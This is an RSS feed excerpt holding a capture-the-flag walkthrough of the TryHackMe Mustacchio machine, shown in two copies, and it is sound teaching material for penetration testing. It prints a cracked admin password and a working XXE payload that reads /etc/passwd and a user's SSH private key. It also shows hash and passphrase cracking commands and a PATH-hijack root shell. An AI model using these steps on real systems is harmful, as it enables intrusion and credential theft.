<li><a href="https://www.linode.com/docs/guides/windows-red-team-defense-evasion-techniques/">Windows Red Team Defense Evasion Techniques</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Mustacchio Walkthrough | Try Hack Me | Ally Petitt</title>
      <link>https://ally-petitt.com:443/en/posts/2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b/</link>
      <pubDate>Fri, 18 Feb 2022 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.com:443/en/posts/2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*F19asfqgh7o-jFDVwsTizA.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;Hey everyone! This is a write-up of how I was able to pwn the Mustacchio machine. I hope you enjoy!&lt;/p&gt;
&lt;p&gt;Notes: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;This was done on a Kali Linux machine so the commands might be slightly different if you are on Windows&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;enumeration&#34;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;To begin, I scanned for open ports using &lt;a href=&#34;https://github.com/RustScan/RustScan&#34;&gt;RustScan&lt;/a&gt;. RustScan, for those who have never heard of it, is essentially a much faster version of Nmap. You can use Nmap if you prefer. My results were as follows:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;PORT STATE SERVICE REASON VERSION   22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)   80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))   | http-robots.txt: 1 disallowed entry    |_/   | http-methods:    |_ Supported Methods: GET HEAD POST OPTIONS   |_http-server-header: Apache/2.4.18 (Ubuntu)   |_http-title: Mustacchio | Home   8765/tcp open http syn-ack nginx 1.10.3 (Ubuntu)   |_http-server-header: nginx/1.10.3 (Ubuntu)   |_http-title: Mustacchio | Login   | http-methods:    |_ Supported Methods: GET HEAD POST   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;As shown by this scan, there are 3 ports open. I investigated the website on port 80 first. I looked through the source code, checked for cookies, looked for linked javascript files, and tested the contact form for cross-site scripting. I found nothing interesting, so I continued to do directory enumeration using &lt;a href=&#34;https://github.com/ffuf/ffuf&#34;&gt;FFUF&lt;/a&gt; (you can also use Wfuzz, Gobuster, or DirBuster for this part).&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ffuf -u &amp;lt;http://10.10.93.193/FUZZ&amp;gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*erwnChNmTvF8tXrU6r_S-Q.png&#34; alt=&#34;&#34;  /&gt;

The custom directory looks interesting. I noticed it earlier when I was looking at the linked JavaScript files. Let’s investigate.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*V_As8mpAktOxs0GjknBnAw.png&#34; alt=&#34;&#34;  /&gt;

And we have access to these files! I went inside the JavaScript file and found a file called users.bak. I downloaded the file and ran the strings command on it.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ strings users.bak    SQLite format 3   tableusersusers   CREATE TABLE users(username text NOT NULL, password text NOT NULL)   ]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;From this file, we have learned that they are using SQLite 3 to store their users. Now, we have a way to view the admin user in their database. Great! Before we go deeper into this, I’d like to explore the other web server running on port 8765.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*tmf5emcwConOrADGYV4Veg.png&#34; alt=&#34;&#34;  /&gt;

How great is this! We found the admin panel where we can log in as admin. Let’s see if we can get the admin credentials using the users.bak file.&lt;/p&gt;
&lt;h1 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h1&gt;
&lt;p&gt;After a few Google searches, I found out how to open this file. I used the SQLite3 CLI:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ sqlite3 users.bak   SQLite version 3.36.0 2021–06–18 18:36:39   Enter “.help” for usage hints.   sqlite&amp;gt; .tables   users   sqlite&amp;gt; .dump users   PRAGMA foreign_keys=OFF;   BEGIN TRANSACTION;   CREATE TABLE users(username text NOT NULL, password text NOT NULL);   INSERT INTO users VALUES(‘admin’,’1868e36a6d2b17d4c2745f1659433a54d4bc5f4b’);   COMMIT;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And there is the password hash that we found when we initially used the strings command on users.bak 😂. I tried to use my best buddy John for help, but he failed me today. Instead, I resorted to hashcat to crack the password.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ hashcat -m 100 ./hash /usr/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*n3kLAAUq1LNmS2DrlBHwcA.png&#34; alt=&#34;&#34;  /&gt;

And we have our password! With the newfound credentials &lt;code&gt;admin:bulldog19&lt;/code&gt; I logged into the admin console on port 8765. Success! The credentials worked.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*0UmbX55dZohkB-gKgPoRBw.png&#34; alt=&#34;&#34;  /&gt;

While looking at the page source, two things immediately stand out to me.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;I see a comment left by the developer&lt;/li&gt;
&lt;li&gt;The name of the input box is “xml”&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*0tRlE5e6aAO2JQcOEZREOw.png&#34; alt=&#34;&#34;  /&gt;

When I try press submit without writing anything in the textarea, I am greeted by the following alert:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*cD5Mov3ZH_r2YjtzfLoX3w.png&#34; alt=&#34;&#34;  /&gt;

Interesting. Maybe we can submit our own XML code to perform a reverse shell. One of the &lt;a href=&#34;https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870&#34;&gt;most common XML vulnerabilities&lt;/a&gt; is an XML Eternal Entity (XXE) injection, so let’s test for it in this application! I used the XXE payload from this &lt;a href=&#34;https://cybarrior.com/blog/2019/11/28/xml-external-entity-xxe-injection-payload-list/&#34;&gt;blog post&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;`&lt;?xml version=”1.0&#34; encoding=”UTF-8&#34;?&gt;&lt;/p&gt;
&lt;!DOCTYPE comment [&lt;!ENTITY xee SYSTEM “/etc/passwd”&gt; ]&gt;  
&lt;comment&gt;  
 &lt;com&gt;&amp;xee;&lt;/com&gt;  
&lt;/comment&gt;`
&lt;p&gt;When I type this in the text area and press “Submit”, I see the following on my screen:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*XQySYPmpIgWDqkmlXyx_Ag.png&#34; alt=&#34;&#34;  /&gt;

Success! This application is vulnerable to XXE injection. Let’s use this vulnerability to get our first flag.&lt;/p&gt;
&lt;h1 id=&#34;usertxt&#34;&gt;User.txt&lt;/h1&gt;
&lt;p&gt;Here, we can see Barry as a user on this machine. Recalling that we found a comment regarding his SSH key in the source code, maybe we can find his private key to gain SSH access to this server. To do this, I looked inside his .ssh folder inside his home directory. I simply changed &lt;code&gt;/etc/passwd&lt;/code&gt; to &lt;code&gt;/home/barry/.ssh/id_rsa&lt;/code&gt; as &amp;ldquo;id_rsa&amp;rdquo; is a common name for the file containing a private ssh key.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*yEC5KVva_GVYWI45nKBEfg.png&#34; alt=&#34;&#34;  /&gt;

Success! We can now see Barry’s private SSH key. If we were to directly copy-paste this from the webpage we would have formatting issues. Instead, I inspected the page and copied the key from the HTML. I then pasted it into a file called “id_rsa_barry”, &lt;strong&gt;making sure that there is no white space&lt;/strong&gt;. I changed the permissions on the file using this command:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;chmod 400 id_rsa_barry&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;I went to ssh into the machine and this was my result:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*mGKSvT93JzuxBhgxAvxBIg.png&#34; alt=&#34;&#34;  /&gt;

It seems that we need a passphrase. The passphrase should be within the private SSH key file, which we can crack using John.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ python3 /usr/share/john/ssh2john.py id_rsa_barry &amp;gt; id_rsa_barry.hash    $ john — wordlist=/usr/share/wordlists/rockyou.txt id_rsa_barry.hash&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*DFe8cHaY9rABFQoOAkr-iA.png&#34; alt=&#34;&#34;  /&gt;

Great! Now we have the passphrase to use. I used the same ssh command from before to log in and entered the passphrase that I just found. And we are in.&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*RBrrcp7EVvjb9szz2tLUGg.png&#34; alt=&#34;&#34;  /&gt;

Privilege Escalation&lt;/h1&gt;
&lt;p&gt;First, I took a look at Barry’s id.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;barry@mustacchio:~$ id   uid=1003(barry) gid=1003(barry) groups=1003(barry)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;It appears that he is not in any groups that we could use for privilege escalation. I also used &lt;code&gt;sudo -l&lt;/code&gt; to see if there are any commands that we can run as root without a password. This turned out not to be the case. Then, I checked for any SUID binaries. These are files that can run with root privileges.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;barry@mustacchio:~$ find / -perm -4000 2&amp;gt;/dev/null  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/x86\_64-linux-gnu/lxc/lxc-user-nic  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/eject/dmcrypt-get-device  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/policykit-1/polkit-agent-helper-1  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/snapd/snap-confine  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/openssh/ssh-keysign  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/passwd  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/pkexec  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/chfn  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/newgrp  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/at  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/chsh  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/newgidmap  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/sudo  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/newuidmap  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/gpasswd  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;**/home/joe/live\_log**  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/bin/ping  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/bin/ping6  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/bin/umount  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/bin/mount  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/bin/fusermount  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/bin/su
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Interesting, “live_log” is in Joe’s home directory. Maybe we have permission to execute it.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;barry@mustacchio:~$ cd /home/joe &amp;amp;&amp;amp; ls -la   total 28   drwxr-xr-x 2 joe joe 4096 Jun 12 2021 .   drwxr-xr-x 4 root root 4096 Jun 12 2021 ..   -rwsr-xr-x 1 root root 16832 Jun 12 2021 live_log&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And we do! When I run it, it appears to launch an application.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*4UbZ77EZp3aHOXEHYvNonQ.png&#34; alt=&#34;&#34;  /&gt;

This isn’t very useful to us because we can’t interact with the application! Instead, I looked further into the file using the &lt;code&gt;strings&lt;/code&gt; command. Additionally, I used &lt;code&gt;awk&lt;/code&gt; so that we would only see the long strings that are more likely to be helpful. If nothing useful came out, then I would lower the minimum string length from 15 characters to 10 and so on because the output can often be very long.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ strings live_log | awk ‘length($0) &amp;gt; 15’&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*8nyN1k4x9nZpM1sGpDmSsg.png&#34; alt=&#34;&#34;  /&gt;

Interesting. There is a path to “access.log” and the full path for the &lt;code&gt;tail&lt;/code&gt; command isn’t used. Maybe we can change the PATH variable so that we can use our own “tail” command that gives us root.&lt;/p&gt;
&lt;p&gt;`$ export PATH=/tmp&lt;br&gt;
$ cd /tmp&lt;br&gt;
$ echo “/bin/bash -p” &amp;gt; tail&lt;br&gt;
$ /bin/chmod +x tail&lt;br&gt;
$ /home/joe/live_log&lt;/p&gt;
&lt;h1 id=&#34;usrbinwhoami&#34;&gt;/usr/bin/whoami&lt;/h1&gt;
&lt;p&gt;root&lt;/p&gt;
&lt;h1 id=&#34;bincat-rootroottxt&#34;&gt;/bin/cat /root/root.txt&lt;/h1&gt;
&lt;p&gt;[REDACTED]`&lt;/p&gt;
&lt;p&gt;And it works! Since “live_log” was an SUID binary, we were able to run it as root. We were able to redirect the path from &lt;code&gt;/usr/bin/tail&lt;/code&gt; to &lt;code&gt;/tmp/tail&lt;/code&gt; which allowed us to run &lt;code&gt;/bin/bash&lt;/code&gt; as root, giving us a root shell.&lt;/p&gt;
&lt;p&gt;That’s all! I hope you enjoyed my explanations. Please send me any constructive feedback &lt;a href=&#34;https://www.linkedin.com/in/ally-petitt-5a02aa208/&#34;&gt;via LinkedIn&lt;/a&gt;. Thank you and take care!&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*F19asfqgh7o-jFDVwsTizA.png" alt=""  />
</p>
<h1 id="introduction"><strong>Introduction</strong></h1>
<p>Hey everyone! This is a write-up of how I was able to pwn the Mustacchio machine. I hope you enjoy!</p>
<p>Notes: </p>
<ul>
<li>This was done on a Kali Linux machine so the commands might be slightly different if you are on Windows</li>
</ul>
<h1 id="enumeration"><strong>Enumeration</strong></h1>
<p>To begin, I scanned for open ports using <a href="https://github.com/RustScan/RustScan">RustScan</a>. RustScan, for those who have never heard of it, is essentially a much faster version of Nmap. You can use Nmap if you prefer. My results were as follows:</p>
<p><code>PORT STATE SERVICE REASON VERSION   22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)   80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))   | http-robots.txt: 1 disallowed entry    |_/   | http-methods:    |_ Supported Methods: GET HEAD POST OPTIONS   |_http-server-header: Apache/2.4.18 (Ubuntu)   |_http-title: Mustacchio | Home   8765/tcp open http syn-ack nginx 1.10.3 (Ubuntu)   |_http-server-header: nginx/1.10.3 (Ubuntu)   |_http-title: Mustacchio | Login   | http-methods:    |_ Supported Methods: GET HEAD POST   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p>
<p>As shown by this scan, there are 3 ports open. I investigated the website on port 80 first. I looked through the source code, checked for cookies, looked for linked javascript files, and tested the contact form for cross-site scripting. I found nothing interesting, so I continued to do directory enumeration using <a href="https://github.com/ffuf/ffuf">FFUF</a> (you can also use Wfuzz, Gobuster, or DirBuster for this part).</p>
<p><code>ffuf -u &lt;http://10.10.93.193/FUZZ&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*erwnChNmTvF8tXrU6r_S-Q.png" alt=""  />

The custom directory looks interesting. I noticed it earlier when I was looking at the linked JavaScript files. Let’s investigate.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*V_As8mpAktOxs0GjknBnAw.png" alt=""  />

And we have access to these files! I went inside the JavaScript file and found a file called users.bak. I downloaded the file and ran the strings command on it.</p>
<p><code>$ strings users.bak    SQLite format 3   tableusersusers   CREATE TABLE users(username text NOT NULL, password text NOT NULL)   ]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b</code></p>
<p>From this file, we have learned that they are using SQLite 3 to store their users. Now, we have a way to view the admin user in their database. Great! Before we go deeper into this, I’d like to explore the other web server running on port 8765.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*tmf5emcwConOrADGYV4Veg.png" alt=""  />

How great is this! We found the admin panel where we can log in as admin. Let’s see if we can get the admin credentials using the users.bak file.</p>
<h1 id="exploitation">Exploitation</h1>
<p>After a few Google searches, I found out how to open this file. I used the SQLite3 CLI:</p>
<p><code>$ sqlite3 users.bak   SQLite version 3.36.0 2021–06–18 18:36:39   Enter “.help” for usage hints.   sqlite&gt; .tables   users   sqlite&gt; .dump users   PRAGMA foreign_keys=OFF;   BEGIN TRANSACTION;   CREATE TABLE users(username text NOT NULL, password text NOT NULL);   INSERT INTO users VALUES(‘admin’,’1868e36a6d2b17d4c2745f1659433a54d4bc5f4b’);   COMMIT;</code></p>
<p>And there is the password hash that we found when we initially used the strings command on users.bak 😂. I tried to use my best buddy John for help, but he failed me today. Instead, I resorted to hashcat to crack the password.</p>
<p><code>$ hashcat -m 100 ./hash /usr/share/wordlists/rockyou.txt</code></p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*n3kLAAUq1LNmS2DrlBHwcA.png" alt=""  />

And we have our password! With the newfound credentials <code>admin:bulldog19</code> I logged into the admin console on port 8765. Success! The credentials worked.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*0UmbX55dZohkB-gKgPoRBw.png" alt=""  />

While looking at the page source, two things immediately stand out to me.</p>
<ol>
<li>I see a comment left by the developer</li>
<li>The name of the input box is “xml”</li>
</ol>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*0tRlE5e6aAO2JQcOEZREOw.png" alt=""  />

When I try press submit without writing anything in the textarea, I am greeted by the following alert:</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*cD5Mov3ZH_r2YjtzfLoX3w.png" alt=""  />

Interesting. Maybe we can submit our own XML code to perform a reverse shell. One of the <a href="https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870">most common XML vulnerabilities</a> is an XML Eternal Entity (XXE) injection, so let’s test for it in this application! I used the XXE payload from this <a href="https://cybarrior.com/blog/2019/11/28/xml-external-entity-xxe-injection-payload-list/">blog post</a>:</p>
<p>`<?xml version=”1.0" encoding=”UTF-8"?></p>
<!DOCTYPE comment [<!ENTITY xee SYSTEM “/etc/passwd”> ]>  
<comment>  
 <com>&xee;</com>  
</comment>`
<p>When I type this in the text area and press “Submit”, I see the following on my screen:</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*XQySYPmpIgWDqkmlXyx_Ag.png" alt=""  />

Success! This application is vulnerable to XXE injection. Let’s use this vulnerability to get our first flag.</p>
<h1 id="usertxt">User.txt</h1>
<p>Here, we can see Barry as a user on this machine. Recalling that we found a comment regarding his SSH key in the source code, maybe we can find his private key to gain SSH access to this server. To do this, I looked inside his .ssh folder inside his home directory. I simply changed <code>/etc/passwd</code> to <code>/home/barry/.ssh/id_rsa</code> as &ldquo;id_rsa&rdquo; is a common name for the file containing a private ssh key.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*yEC5KVva_GVYWI45nKBEfg.png" alt=""  />

Success! We can now see Barry’s private SSH key. If we were to directly copy-paste this from the webpage we would have formatting issues. Instead, I inspected the page and copied the key from the HTML. I then pasted it into a file called “id_rsa_barry”, <strong>making sure that there is no white space</strong>. I changed the permissions on the file using this command:</p>
<p><code>chmod 400 id_rsa_barry</code></p>
<p>I went to ssh into the machine and this was my result:</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*mGKSvT93JzuxBhgxAvxBIg.png" alt=""  />

It seems that we need a passphrase. The passphrase should be within the private SSH key file, which we can crack using John.</p>
<p><code>$ python3 /usr/share/john/ssh2john.py id_rsa_barry &gt; id_rsa_barry.hash    $ john — wordlist=/usr/share/wordlists/rockyou.txt id_rsa_barry.hash</code></p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*DFe8cHaY9rABFQoOAkr-iA.png" alt=""  />

Great! Now we have the passphrase to use. I used the same ssh command from before to log in and entered the passphrase that I just found. And we are in.</p>
<h1 id="privilege-escalation"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*RBrrcp7EVvjb9szz2tLUGg.png" alt=""  />

Privilege Escalation</h1>
<p>First, I took a look at Barry’s id.</p>
<p><code>barry@mustacchio:~$ id   uid=1003(barry) gid=1003(barry) groups=1003(barry)</code></p>
<p>It appears that he is not in any groups that we could use for privilege escalation. I also used <code>sudo -l</code> to see if there are any commands that we can run as root without a password. This turned out not to be the case. Then, I checked for any SUID binaries. These are files that can run with root privileges.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>barry@mustacchio:~$ find / -perm -4000 2&gt;/dev/null  
</span></span><span style="display:flex;"><span>/usr/lib/x86\_64-linux-gnu/lxc/lxc-user-nic  
</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device  
</span></span><span style="display:flex;"><span>/usr/lib/policykit-1/polkit-agent-helper-1  
</span></span><span style="display:flex;"><span>/usr/lib/snapd/snap-confine  
</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign  
</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
</span></span><span style="display:flex;"><span>/usr/bin/passwd  
</span></span><span style="display:flex;"><span>/usr/bin/pkexec  
</span></span><span style="display:flex;"><span>/usr/bin/chfn  
</span></span><span style="display:flex;"><span>/usr/bin/newgrp  
</span></span><span style="display:flex;"><span>/usr/bin/at  
</span></span><span style="display:flex;"><span>/usr/bin/chsh  
</span></span><span style="display:flex;"><span>/usr/bin/newgidmap  
</span></span><span style="display:flex;"><span>/usr/bin/sudo  
</span></span><span style="display:flex;"><span>/usr/bin/newuidmap  
</span></span><span style="display:flex;"><span>/usr/bin/gpasswd  
</span></span><span style="display:flex;"><span>**/home/joe/live\_log**  
</span></span><span style="display:flex;"><span>/bin/ping  
</span></span><span style="display:flex;"><span>/bin/ping6  
</span></span><span style="display:flex;"><span>/bin/umount  
</span></span><span style="display:flex;"><span>/bin/mount  
</span></span><span style="display:flex;"><span>/bin/fusermount  
</span></span><span style="display:flex;"><span>/bin/su
</span></span></code></pre></div><p>Interesting, “live_log” is in Joe’s home directory. Maybe we have permission to execute it.</p>
<p><code>barry@mustacchio:~$ cd /home/joe &amp;&amp; ls -la   total 28   drwxr-xr-x 2 joe joe 4096 Jun 12 2021 .   drwxr-xr-x 4 root root 4096 Jun 12 2021 ..   -rwsr-xr-x 1 root root 16832 Jun 12 2021 live_log</code></p>
<p>And we do! When I run it, it appears to launch an application.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*4UbZ77EZp3aHOXEHYvNonQ.png" alt=""  />

This isn’t very useful to us because we can’t interact with the application! Instead, I looked further into the file using the <code>strings</code> command. Additionally, I used <code>awk</code> so that we would only see the long strings that are more likely to be helpful. If nothing useful came out, then I would lower the minimum string length from 15 characters to 10 and so on because the output can often be very long.</p>
<p><code>$ strings live_log | awk ‘length($0) &gt; 15’</code></p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*8nyN1k4x9nZpM1sGpDmSsg.png" alt=""  />

Interesting. There is a path to “access.log” and the full path for the <code>tail</code> command isn’t used. Maybe we can change the PATH variable so that we can use our own “tail” command that gives us root.</p>
<p>`$ export PATH=/tmp<br>
$ cd /tmp<br>
$ echo “/bin/bash -p” &gt; tail<br>
$ /bin/chmod +x tail<br>
$ /home/joe/live_log</p>
<h1 id="usrbinwhoami">/usr/bin/whoami</h1>
<p>root</p>
<h1 id="bincat-rootroottxt">/bin/cat /root/root.txt</h1>
<p>[REDACTED]`</p>
<p>And it works! Since “live_log” was an SUID binary, we were able to run it as root. We were able to redirect the path from <code>/usr/bin/tail</code> to <code>/tmp/tail</code> which allowed us to run <code>/bin/bash</code> as root, giving us a root shell.</p>
<p>That’s all! I hope you enjoyed my explanations. Please send me any constructive feedback <a href="https://www.linkedin.com/in/ally-petitt-5a02aa208/">via LinkedIn</a>. Thank you and take care!</p>
]]></content:encoded>
    </item>
  </channel>
</rss>
